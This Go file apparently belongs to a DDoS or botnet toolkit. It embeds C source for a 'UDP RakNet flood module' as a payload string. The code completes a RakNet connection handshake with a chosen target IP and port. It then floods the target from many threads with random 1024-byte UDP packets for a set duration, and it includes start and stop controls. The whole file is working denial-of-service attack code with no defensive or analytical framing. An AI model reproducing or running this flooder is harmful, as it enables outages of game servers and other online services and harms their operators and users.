package payloads

var UDPRaknet = `
// ==================== UDP RAKNET FLOOD MODULE ====================
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define OPEN_CONNECTION_REQUEST_1 0x05
#define OPEN_CONNECTION_REPLY_1 0x06
#define OPEN_CONNECTION_REQUEST_2 0x07
#define PROTOCOL_VERSION 0x0A

static int raknet_attack_running = 0;
static pthread_t raknet_threads[100];

uint64_t random_uuid_rak() {
    unsigned char randomBytes[16];
    for (size_t i = 0; i < 16; ++i) randomBytes[i] = rand() % 256;
    randomBytes[6] &= 0x0f; randomBytes[6] |= 0x40;
    randomBytes[8] &= 0x3f; randomBytes[8] |= 0x80;
    uint64_t random_uid = 0;
    memcpy(&random_uid, randomBytes, sizeof(uint64_t));
    return random_uid;
}

void raknet_addr_conv(const struct sockaddr_in *sockaddr, uint32_t *result) {
    uint32_t address = ntohl(sockaddr->sin_addr.s_addr);
    result[0] = 255 - (address >> 24) & 0xFF;
    result[1] = 255 - (address >> 16) & 0xFF;
    result[2] = 255 - (address >> 8) & 0xFF;
    result[3] = 255 - address & 0xFF;
    result[4] = htons(sockaddr->sin_port) >> 8;
    result[5] = htons(sockaddr->sin_port);
}

void *raknet_flood(void *arg) {
    char *target_ip = (char *)arg;
    int port = *(int *)((char *)arg + 64);
    int duration = *(int *)((char *)arg + 68);
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = inet_addr(target_ip);
    
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return NULL;
    
    struct sockaddr_in bind_addr = {0};
    bind_addr.sin_family = AF_INET;
    bind_addr.sin_port = htons(rand() & 0xFFFF);
    bind_addr.sin_addr.s_addr = 0;
    bind(fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr));
    
    uint32_t addr_rak[6];
    uint64_t random_uid = random_uuid_rak();
    raknet_addr_conv(&sin, addr_rak);
    
    uint8_t req1[] = {
        OPEN_CONNECTION_REQUEST_1,
        0x00, 0xFF, 0xFF, 0x00, 0xFE, 0xFE, 0xFE, 0xFE,
        0xFD, 0xFD, 0xFD, 0xFD, 0x12, 0x34, 0x56, 0x78,
        PROTOCOL_VERSION, 0x00, 0x00, 0x00};
    
    sendto(fd, req1, sizeof(req1), 0, (struct sockaddr *)&sin, sizeof(sin));
    
    uint8_t buffer[32];
    struct sockaddr_in sender;
    socklen_t sender_len;
    while (1) {
        sender_len = sizeof(sender);
        ssize_t bytes = recvfrom(fd, buffer, sizeof(buffer), 0, (struct sockaddr *)&sender, &sender_len);
        if (bytes > 0 && buffer[0] == OPEN_CONNECTION_REPLY_1) break;
    }
    
    uint8_t req2[] = {
        OPEN_CONNECTION_REQUEST_2,
        0x00, 0xFF, 0xFF, 0x00, 0xFE, 0xFE, 0xFE, 0xFE,
        0xFD, 0xFD, 0xFD, 0xFD, 0x12, 0x34, 0x56, 0x78,
        0x04,
        addr_rak[0], addr_rak[1], addr_rak[2], addr_rak[3],
        addr_rak[4], addr_rak[5],
        0x00, 0x00, 0x00,
        (uint8_t)(random_uid >> 56), (uint8_t)(random_uid >> 48),
        (uint8_t)(random_uid >> 40), (uint8_t)(random_uid >> 32),
        (uint8_t)(random_uid >> 24), (uint8_t)(random_uid >> 16),
        (uint8_t)(random_uid >> 8), (uint8_t)random_uid};
    
    sendto(fd, req2, sizeof(req2), 0, (struct sockaddr *)&sin, sizeof(sin));
    
    char *payload = malloc(1024);
    time_t start = time(NULL);
    
    while (raknet_attack_running && time(NULL) - start < duration) {
        for (int i = 0; i < 1024; i++) payload[i] = rand() % 256;
        sendto(fd, payload, 1024, 0, (struct sockaddr *)&sin, sizeof(sin));
    }
    
    free(payload);
    close(fd);
    return NULL;
}

void start_raknet_attack(char *target, int port, int threads, int duration_sec) {
    if (raknet_attack_running) return;
    raknet_attack_running = 1;
    
    char *arg = malloc(128);
    strcpy(arg, target);
    *((int *)(arg + 64)) = port;
    *((int *)(arg + 68)) = duration_sec;
    
    for (int i = 0; i < threads; i++) {
        pthread_create(&raknet_threads[i], NULL, raknet_flood, arg);
    }
    
    sleep(duration_sec);
    raknet_attack_running = 0;
    for (int i = 0; i < threads; i++) {
        pthread_join(raknet_threads[i], NULL);
    }
    free(arg);
}

void stop_raknet_attack() { raknet_attack_running = 0; }
// ==================== END RAKNET MODULE ====================
`